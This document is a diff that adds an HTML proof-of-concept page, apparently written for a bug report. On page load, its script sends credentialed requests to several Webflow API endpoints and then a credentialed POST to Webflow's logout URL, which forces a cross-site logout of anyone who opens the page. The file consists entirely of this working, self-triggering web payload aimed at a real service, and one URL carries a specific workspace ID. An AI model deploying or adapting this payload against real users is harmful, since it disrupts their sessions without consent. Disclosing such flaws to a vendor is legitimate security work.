@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>POC Auto Trigger</title>
+</head>
+<body>
+  <script>
+    function sendRequests() {
+      const urls = [
+        "https://webflow.com/api/feature-config/config/dashboard-client/workspace/?path=%2Fdashboard%2Flogout&pathWithParams=%2Fdashboard%2Flogout",
+        "https://webflow.com/api/feature-config/config/dashboard-client/workspace/6873b55874991b101ff0d780?path=%2Fdashboard%2Flogout&pathWithParams=%2Fdashboard%2Flogout",
+        "https://webflow.com/api/feature-config/config/dashboard-client/workspace/6873b55874991b101ff0d780?path=%2Fdashboard%2Flogout&pathWithParams=%2Fdashboard%2Flogout",
+        "https://webflow.com/api/feature-config/config/dashboard-client/workspace/6873b55874991b101ff0d780?path=%2Fdashboard%2Flogout&pathWithParams=%2Fdashboard%2Flogout"
+      ];
+
+      urls.forEach(url => {
+        fetch(url, {
+          method: "GET",
+          credentials: "include"
+        }).catch(console.error);
+      });
+
+      fetch("https://webflow.com/dashboard/logout", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: ""
+      }).catch(console.error);
+    }
+
+    window.addEventListener("load", sendRequests);
+  </script>
+</body>
+</html>
